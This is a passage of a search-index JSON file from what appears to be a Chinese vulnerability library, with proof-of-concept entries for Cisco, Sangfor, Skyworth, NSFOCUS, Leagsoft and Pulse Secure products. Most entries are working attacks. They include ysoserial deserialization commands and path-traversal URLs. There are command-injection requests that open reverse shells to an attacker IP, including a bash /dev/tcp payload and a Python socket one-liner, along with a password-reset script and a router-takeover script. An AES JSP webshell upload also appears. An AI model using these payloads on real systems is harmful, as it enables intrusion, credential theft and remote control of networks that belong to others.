directory.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#samplefiledownloadservlet","title":"SampleFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"<pre><code>GET /cwhp/SampleFileDownloadServlet?downloadZipFileName=pwned&amp;downloadFiles=README&amp;downloadLocation=[RELATIVE_PATH_TO_DIRECTORY]\n</code></pre> <p>This will respond with a ZIP file containing all files from the directory.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#resultsframejsp","title":"resultsFrame.jsp \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"<pre><code>GET /athena/itf/resultsFrame.jsp?filename=[RELATIVE_PATH_TO_FILE]\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#secretserviceservlet","title":"SecretServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>See also https://de.tenable.com/security/research/tra-2017-23</p> <pre><code>java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\"\njava -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' &gt; payload_JRMP1_2\ncurl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.SecretServiceServlet\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#_2","title":"\u53c2\u8003","text":"<p>https://www.zdnet.com/article/cisco-reveals-this-critical-bug-in-cisco-security-manager-after-exploits-are-posted-patch-now/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-3452%EF%BC%9ACisco_ASAFTD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"CVE 2020 3452\uff1aCisco ASAFTD\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"<p>CVE-2020-3452\uff1aCisco_ASAFTD\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e  </p> <p>POC</p> <pre><code>For example to read \"/+CSCOE+/portal_inc.lua\" file. https://&lt;domain&gt;/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../\n</code></pre> <p>POC</p> <pre><code>https://&lt;domain&gt;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/","title":"\u6df1\u4fe1\u670dEDR \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-2020-hvv2","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u53d7\u5f71\u54cd\u7248\u672c\u4e3a3.2.17R1, 3.2.21\u4e24\u4e2a\u7248\u672c\uff0c\u5982\u679c\u4e3a\u8fd9\u4e24\u4e2a\u7248\u672c\u5efa\u8bae\u5347\u7ea7\u7248\u672c\u81f3 3.2.21.375</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>POC</p> <pre><code>POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1\nHost: xx.x.x.x\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.22.0\nContent-Length: 77\n\n{\"params\": \"w=123\\\"'1234123'\\\"|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"} \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EDR 3.2.16\u30013.2.17\u30013.2.19</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u53c2\u6570host/path/row/limit=\u547d\u4ee4 \u5373\u53ef\u6267\u884c\u547d\u4ee4</p> <pre><code>https://*****/tool/log/c.php?strip_slashes=system&amp;host=id\nhttps://*****/tool/log/c.php?strip_slashes=system&amp;path=id\nhttps://*****/tool/log/c.php?strip_slashes=system&amp;row=id\nhttps://*****/tool/log/c.php?strip_slashes=system&amp;limit=id\n</code></pre> <pre><code>#\u8d8a\u6743\u767b\u5f55\nhttps://ip:xx/ui/login.php?user=admin   #(\u7528\u6237\u540d\u5fc5\u987b\u5b58\u5728)\n#\u547d\u4ee4\u6267\u884c\nhttps://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&amp;host=id\nhttps://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&amp;host=whoami\n#\u53cd\u5f39shell\nhttps://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&amp;path=python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"\n</code></pre> <p></p> <p>1.jpg</p> <p></p> <p>2.jpg</p> <p></p> <p>3.jpg</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>EDR &lt;=3.2.19</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>user=\u4efb\u610f\u7528\u6237\u540d\u5373\u53ef\u767b\u5f55\uff08\u7528\u6237\u540d\u5b58\u5728\uff09\uff1a</p> <pre><code>https://******/ui/login.php?user=admin\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u4fee\u6539\u7ed1\u5b9a\u624b\u673a","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>M7.6.1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>https://127.0.0.1/por/changetelnum.csp?apiversion=1 \nPOST\uff1a\nnewtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1 \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u5bc6\u7801\u91cd\u7f6e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>\u5df2\u77e5M7.6.6R1 M7.6.1 \u5176\u4ed6\u7248\u672c\u6709\u5f85\u6d4b\u8bd5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>M7.6.6R1 key \u4e3a 20181118 M7.6.1 key \u4e3a 20100720``` https:///por/changepwd.csp <p>sessReq=clusterd&amp;sessid=0&amp;str=RC4_STR&amp;len=RC4_STR_LEN  `````` \u8ba1\u7b97RC4_STR_LEN\u811a\u672c from Crypto.Cipher import ARC4 from binascii import a2b_hex</p> <p>def myRC4(data,key):     rc41 = ARC4.new(key)     encrypted = rc41.encrypt(data)     return encrypted.encode('hex')</p> <p>def rc4_decrpt_hex(data,key):     rc41 = ARC4.new(key)     return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print myRC4(data, key)  ```</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"\u5929\u7ffc\u521b\u7ef4awifi\u8def\u7531\u5668\u5b58\u5728\u591a\u5904\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u5929\u7ffc\u521b\u7ef4awifi\u8def\u7531\u5668\u5b58\u5728\u591a\u5904\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e 2019-06-01 H4lo http://www.skyworth.com/ http://www.skyworth.com/ Boa/0.94.14rc21 CVE-2019-12862"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<pre><code>#coding: utf-8\n#__author__: H4lo\nimport requests\nimport sys\n\n\npayload = \"authflag=1\"\nUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36\"\nheaders = {\n    \"User-Agent\": UA,\n    \"Cookie\": payload\n}\n\ndef exp(ip):\n    info = \"\"\"1. Login with no password\\n2. Change administrator's password\\n\"\"\"\n    print info\n    op = int(raw_input(\"Enter the options:\"))\n    if op == 1:\n        url = \"http://\" + str(ip)+\"/home.htm\"\n        try:\n            res = requests.get(url,headers=headers,timeout=5)\n            if \"title.htm\" in res.text:\n                print \"[+] The router is vulnerable\"\n            else:\n                print \"[-] The router is not vulnerable\"\n        except Exception as e:\n            print str(e)\n\n    elif(op == 2):\n        url = \"http://\" + str(ip) + \"/boafrm/formAwifiSwitchSetup\"\n        data = {\n            \"olduserpass\":\"1\",\n            \"newpass\":\"123456\",\n            \"confirmnewpass\":\"123456\",\n            \"submit-url\":\"/password.htm\"\n        }\n        try:\n            res = requests.post(url=url,headers=headers,data=data,timeout=5)\n            if \"restartNow\" in res.text:\n                print \"[+] Password had be changed to 123456\"\n            else:\n                print \"[-] Some error!\"\n        except Exception as e:\n            print str(e)\n\n    else:\n        print \"error options!\"\nif __name__ == '__main__':\n    ip = sys.argv[1]\n    exp(ip)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/","title":"\u7eff\u76dfUTS\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u7ba1\u7406\u5458\u4efb\u610f\u767b\u5f55","text":"<p>\u6f0f\u6d1e\u8be6\u60c5\uff1a \u7eff\u76df\u5168\u6d41\u91cf\u5a01\u80c1\u5206\u6790\u89e3\u51b3\u65b9\u6848\u9488\u5bf9\u539f\u59cb\u6d41\u91cf\u8fdb\u884c\u91c7\u96c6\u548c\u76d1\u63a7\uff0c\u5bf9\u6d41\u91cf\u4fe1\u606f\u8fdb\u884c\u6df1\u5ea6\u8fd8\u539f\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u548c\u5206\u6790\uff0c\u53ef\u4ee5\u53ca\u65f6\u638c\u63e1\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u98ce\u9669\uff0c\u53ca\u65f6\u68c0\u6d4b\u6f0f\u6d1e\u3001\u75c5\u6bd2\u6728\u9a6c\u3001\u7f51\u7edc\u653b\u51fb\u60c5\u51b5\uff0c\u53ca\u65f6\u53d1\u73b0\u7f51\u7edc\u5b89\u5168\u4e8b\u4ef6\u7ebf\u7d22\uff0c\u53ca\u65f6\u901a\u62a5\u9884\u8b66\u91cd\u5927\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\uff0c\u8c03\u67e5\u3001\u9632\u8303\u548c\u6253\u51fb\u7f51\u7edc\u653b\u51fb\u7b49\u6076\u610f\u884c\u4e3a\uff0c\u4fdd\u969c\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u7684\u7f51\u7edc\u5b89\u5168\u3002 \u7eff\u76df\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u8bbe\u5907\u7248\u672cV2.0R00F02SP02\u53ca\u4e4b\u524d\u5b58\u5728\u6b64\u6f0f\u6d1e\u3002 \u5904\u7f6e\u610f\u89c1: \u5efa\u8bae\u5c3d\u5feb\u66f4\u65b0\u8865\u4e01\u81f3\u6700\u65b0\uff1a http://update.nsfocus.com/update/listBsaUtsDetail/v/F02 \u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a  \u5bf9\u54cd\u5e94\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u5c06false\u66f4\u6539\u4e3atrue\u7684\u65f6\u5019\u53ef\u4ee5\u6cc4\u9732\u7ba1\u7406\u7528\u6237\u7684md5\u503c\u5bc6\u7801   \u5229\u7528\u6e20\u9053\u7684md5\u503c\u53bb\u767b\u5f55\u9875\u9762   7ac301836522b54afcbbed714534c7fb  \u6210\u529f\u767b\u5f55\uff0c\u767b\u5f55\u540e\u901a\u8fc7\u7ba1\u7406\u5458\u6743\u9650\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u63a7\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u5927\u91cf\u7684\u653b\u51fb\u4fe1\u606f\uff0c\u6cc4\u9732\u5185\u90e8\u7f51\u7edc\u5730\u5740\u5305\u62ec\u8d44\u4ea7\u7ba1\u7406\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FWAF%E7%BB%95%E8%BF%87/","title":"\u7eff\u76dfWAF\u7ed5\u8fc7","text":"<p>XFF\u4f2a\u9020\u5b57\u6bb5\u5730\u5740\u4e3a127.0.0.1\uff0c\u5bfc\u81f4waf\u4e0a\u770b\u4e0d\u2ec5\u653b\u51fb\u8005\u5730\u5740</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%91%9E%E8%BE%BE/%E7%BD%91%E7%91%9E%E8%BE%BEwebvpn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"\u7f51\u745e\u8fbewebvpn\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"<p>\u4efb\u610f\u666e\u901a\u8d26\u6237\u767b\u9646\u8fdb\u7cfb\u7edf\u8bbf\u95ee1.1.1.1@127.0.0.1:8860 \u8fd4\u56de\u201cpong\"\u4ee3\u8868\u53ef\u4ee5\u8fdb\u884cRCE \u8fd4\u56de401\u4ee3\u8868\u4e0d\u53ef\u4ee5\uff08\u7528\u57df\u540d\u89e3\u6790\u5230127\u7ed5\u8fc7\uff09</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%81%94%E8%BD%AF/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"\u8054\u8f6f\u51c6\u5165-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%81%94%E8%BD%AF/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#poc","title":"POC","text":"<pre><code>POST /uai/download/uploadfileToPath.htm HTTP/1.1\nHOST: xxxxx\n... ...\n\n-----------------------------570xxxxxxxxx6025274xxxxxxxx1\nContent-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\"\nContent-Type: image/png\n\n&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*\u8be5\u5bc6\u94a5\u4e3a\u8fde\u63a5\u5bc6\u780132\u4f4dmd5\u503c\u7684\u524d16\u4f4d\uff0c\u9ed8\u8ba4\u8fde\u63a5\u5bc6\u7801rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;\n\n-----------------------------570xxxxxxxxx6025274xxxxxxxx1\nContent-Disposition: form-data; name=\"uploadpath\"\n\n../webapps/notifymsg/devreport/\n-----------------------------570xxxxxxxxx6025274xxxxxxxx1-- \n\u200b```![](https://www.bylibrary.cn/wp-content/uploads/2020/09/12.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/13.png)\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/","title":"CVE-2019-11510-1","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#exploit-for-arbitrary-file-read-on-pulse-secure-ssl-vpn-cve-2019-11510","title":"Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Pulse Secure Pulse Connect Secure\uff08\u53c8\u540dPCS\uff0c\u524d\u79f0Juniper Junos Pulse\uff09\u662f\u7f8e\u56fdPulse Secure\u516c\u53f8\u7684\u4e00\u5957SSL VPN\u89e3\u51b3\u65b9\u6848\u3002 Pulse Secure PCS 9.0RX\u7248\u672c\u30018.3RX\u7248\u672c\u548c8.2RX\u7248\u672c\u4e2d\u5b58\u5728\u6388\u6743\u95ee\u9898\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u4e2d\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u63aa\u65bd\u6216\u8eab\u4efd\u9a8c\u8bc1\u5f3a\u5ea6\u4e0d\u8db3\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#python-usage","title":"python usage:","text":"<p><code>python CVE-2019-11510.py https://x.x.x.x</code></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#expmsfrubyexp","title":"\u6f0f\u6d1eEXP(MSF\u7684ruby\u8bed\u8a00\u7684EXP)","text":"<pre><code># Exploit Title: File disclosure in Pulse Secure SSL VPN (metasploit)\n# Google Dork: inurl:/dana-na/ filetype:cgi\n# Date: 8/20/2019\n# Exploit Author: 0xDezzy (Justin Wagner), Alyssa Herrera\n# Vendor Homepage: https://pulsesecure.net\n# Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 